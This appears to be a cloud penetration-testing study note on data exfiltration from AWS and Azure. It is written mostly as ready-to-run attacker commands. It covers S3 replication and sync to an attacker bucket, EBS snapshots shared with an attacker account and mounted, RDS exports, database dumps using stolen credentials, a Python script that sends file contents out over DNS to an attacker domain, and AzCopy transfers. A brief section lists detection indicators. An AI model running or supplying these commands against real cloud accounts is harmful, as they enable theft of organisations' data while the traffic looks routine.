# 09.4 — Cloud Exfiltration Techniques

## What This Note Covers

How attackers move data out of cloud environments using cloud-native mechanisms — S3 replication, cross-account copy, snapshot sharing, database export, and exfiltration via legitimate cloud services that blend with normal traffic.

---

## Cloud Exfiltration vs Traditional Exfiltration

Traditional exfiltration: compress data → exfiltrate over network → attacker receives file at external server.

Cloud exfiltration: use cloud-native features to copy data to attacker-controlled cloud resources — the traffic looks like routine cloud infrastructure operations, uses HTTPS to cloud provider endpoints, and may never touch attacker-controlled infrastructure at all.

---

## Technique 1: S3 Cross-Account Replication

S3 has a native replication feature that continuously copies objects from one bucket to another. Configure it to replicate to an attacker-controlled bucket.

```bash
# Requires: s3:PutBucketReplication on the source bucket

# Step 1: Create a destination bucket in attacker's account (us-east-1)
aws s3api create-bucket \
  --bucket attacker-data-collection \
  --region us-east-1 \
  --profile attacker-account

# Step 2: Create a replication role in the VICTIM account
# (that has permission to read source and write to destination)
cat > replication-policy.json << 'EOF'
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": ["s3:GetReplicationConfiguration", "s3:ListBucket"],
      "Resource": "arn:aws:s3:::VICTIM-SOURCE-BUCKET"
    },
    {
      "Effect": "Allow",
      "Action": ["s3:GetObjectVersion", "s3:GetObjectVersionAcl"],
      "Resource": "arn:aws:s3:::VICTIM-SOURCE-BUCKET/*"
    },
    {
      "Effect": "Allow",
      "Action": ["s3:ReplicateObject", "s3:ReplicateDelete"],
      "Resource": "arn:aws:s3:::attacker-data-collection/*"
    }
  ]
}
EOF

# Step 3: Configure replication on the source bucket
cat > replication-config.json << 'EOF'
{
  "Role": "arn:aws:iam::VICTIM_ACCOUNT:role/S3ReplicationRole",
  "Rules": [{
    "ID": "ReplicateAll",
    "Status": "Enabled",
    "Filter": {},
    "Destination": {
      "Bucket": "arn:aws:s3:::attacker-data-collection",
      "Account": "ATTACKER_ACCOUNT_ID",
      "AccessControlTranslation": {"Owner": "Destination"}
    }
  }]
}
EOF

aws s3api put-bucket-replication \
  --bucket VICTIM-SOURCE-BUCKET \
  --replication-configuration file://replication-config.json

# All new objects are now automatically copied to attacker's bucket
# Existing objects must be copied manually (replication only covers new writes)
```

### Sync Existing Data

```bash
# For existing data — use sync to attacker-controlled bucket
aws s3 sync s3://VICTIM-SOURCE-BUCKET s3://attacker-data-collection \
  --source-region us-east-1 \
  --region us-east-1

# Or download directly
aws s3 sync s3://VICTIM-SOURCE-BUCKET /tmp/exfil/
# Then upload to attacker infrastructure
```

## Technique 2: EBS Snapshot Cross-Account Copy

Copy an EBS snapshot to an attacker-controlled account. The snapshot contains the full disk image of an EC2 volume — all files, databases, logs, and credentials that were on disk.

```bash
# Step 1: Create a snapshot of the target volume
aws ec2 create-snapshot \
  --volume-id vol-TARGET_VOLUME \
  --description "automated-backup-$(date +%Y%m%d)" \
  --region us-east-1

SNAP_ID="snap-NEWSNAP"

# Step 2: Share the snapshot with attacker's account
aws ec2 modify-snapshot-attribute \
  --snapshot-id $SNAP_ID \
  --attribute createVolumePermission \
  --operation-type add \
  --user-ids ATTACKER_ACCOUNT_ID

# Step 3: From attacker's account — copy the snapshot
aws ec2 copy-snapshot \
  --source-region us-east-1 \
  --source-snapshot-id $SNAP_ID \
  --region eu-west-1 \
  --profile attacker-account

# Step 4: Create a volume from the copied snapshot
aws ec2 create-volume \
  --snapshot-id COPIED_SNAP_ID \
  --availability-zone eu-west-1a \
  --profile attacker-account

# Step 5: Attach to attacker's EC2 instance and mount
aws ec2 attach-volume \
  --volume-id VOL_ID \
  --instance-id ATTACKER_INSTANCE \
  --device /dev/sdf \
  --profile attacker-account

# Step 6: Mount and read
ssh attacker-instance
sudo mount /dev/xvdf1 /mnt/victim
ls /mnt/victim
# Full filesystem access — databases, credential files, application code
```

## Technique 3: RDS Snapshot Export

Export an RDS database to S3 in Parquet format — a full database dump accessible as files.

```bash
# Create a snapshot of the RDS instance
aws rds create-db-snapshot \
  --db-instance-identifier prod-database \
  --db-snapshot-identifier exfil-snapshot-$(date +%Y%m%d)

# Export the snapshot to S3 (attacker-controlled bucket)
aws rds start-export-task \
  --export-task-identifier data-export-01 \
  --source-arn arn:aws:rds:us-east-1:ACCOUNT:snapshot:exfil-snapshot-20240101 \
  --s3-bucket-name attacker-data-collection \
  --iam-role-arn arn:aws:iam::ACCOUNT:role/ExportRole \
  --kms-key-id arn:aws:kms:us-east-1:ACCOUNT:key/KEY_ID

# The export produces Parquet files — readable with pandas, DuckDB, etc.
aws s3 ls s3://attacker-data-collection/data-export-01/
# Contains: table-level Parquet files with full database content
```

## Technique 4: Database Direct Export via Credentials

If you have database credentials (from Secrets Manager, env vars, or config files), connect directly and dump.

```bash
# PostgreSQL dump via public endpoint
pg_dump -h RDS_ENDPOINT -U admin -d production_db -f /tmp/dump.sql
# Then upload to attacker-controlled storage

# MySQL dump
mysqldump -h RDS_ENDPOINT -u admin -p production_db > /tmp/dump.sql

# MongoDB dump
mongodump --host MONGO_HOST --port 27017 --db target_db --out /tmp/mongodump/

# Redis dump (if BGSAVE allowed)
redis-cli -h REDIS_HOST BGSAVE
redis-cli -h REDIS_HOST DEBUG RELOAD  # alternative
# Then copy the dump.rdb file
```

## Technique 5: Data Exfiltration via Glacier

Glacier is AWS's archive storage. Initiating a restore from a Glacier-archived bucket to a different storage class (and then syncing) is a stealthy long-haul exfiltration method.

```bash
# Restore objects from Glacier to Standard (takes hours)
aws s3api restore-object \
  --bucket VICTIM-BUCKET \
  --key archived/sensitive-data.zip \
  --restore-request '{"Days": 3, "GlacierJobParameters": {"Tier": "Standard"}}'

# After restoration completes — sync to attacker bucket
aws s3 sync s3://VICTIM-BUCKET/archived/ s3://attacker-bucket/
```

## Technique 6: Data Exfiltration via DNS

DNS-based exfiltration encodes data in DNS queries to an attacker-controlled domain. In cloud environments, DNS egress is almost universally allowed.

```bash
# Encode data as DNS subdomain queries
# Each query carries ~60 bytes of base64 data

python3 << 'EOF'
import subprocess, base64, os

data = open('/tmp/sensitive-data.txt', 'rb').read()
chunks = [data[i:i+40] for i in range(0, len(data), 40)]

for i, chunk in enumerate(chunks):
    encoded = base64.b32encode(chunk).decode().lower().rstrip('=')
    domain = f"{i}.{encoded}.exfil.attacker-domain.com"
    subprocess.run(['dig', domain, '@8.8.8.8'], capture_output=True)

print("Exfiltration complete")
EOF

# Attacker reads their DNS server logs for the encoded queries
```

## Technique 7: Azure Storage Cross-Subscription Replication

```bash
# Copy Azure Blob data to attacker-controlled storage account
# Using AzCopy with attacker's SAS token

DEST_SAS="?sv=2021...&sig=ATTACKER_SAS"
azcopy copy \
  "https://VICTIM-STORAGE.blob.core.windows.net/CONTAINER/?VICTIM_SAS" \
  "https://ATTACKER-STORAGE.blob.core.windows.net/exfil/$DEST_SAS" \
  --recursive

# Or using Azure Storage replication (geo-redundancy abuse)
az storage account update \
  --name VICTIM_STORAGE \
  --resource-group RG \
  --sku Standard_GRS  # Enables geo-replication to attacker-accessible region
```

## Detection — What Exfiltration Looks Like

```
CloudTrail indicators:
  PutBucketReplication     → Replication configured (unusual — high alert)
  ModifySnapshotAttribute  → Snapshot shared to external account
  StartExportTask          → RDS export to S3
  CopySnapshot             → Cross-account/region snapshot copy

GuardDuty findings:
  Exfiltration:S3/ObjectRead.Unusual → Unusually large S3 data read
  Exfiltration:EC2/DomainUnderInvestigation → DNS to known-bad domains

Normal-looking traffic (hard to detect):
  S3 sync to another bucket      → Looks like backup operation
  RDS snapshot (routine)         → Looks like maintenance
  DNS queries to external domain → Hard to distinguish from legitimate traffic
```

## Quick Reference — Cloud Exfiltration

```bash
# S3 sync to attacker bucket
aws s3 sync s3://VICTIM-BUCKET s3://ATTACKER-BUCKET

# S3 replication config
aws s3api put-bucket-replication \
  --bucket VICTIM-BUCKET \
  --replication-configuration file://replication-config.json

# EBS snapshot share
aws ec2 create-snapshot --volume-id VOL_ID
aws ec2 modify-snapshot-attribute --snapshot-id SNAP_ID \
  --attribute createVolumePermission \
  --operation-type add --user-ids ATTACKER_ACCOUNT

# RDS export
aws rds create-db-snapshot --db-instance-identifier DB --db-snapshot-identifier SNAP
aws rds start-export-task --export-task-identifier TASK \
  --source-arn SNAP_ARN \
  --s3-bucket-name ATTACKER_BUCKET \
  --iam-role-arn EXPORT_ROLE_ARN \
  --kms-key-id KEY_ARN
```
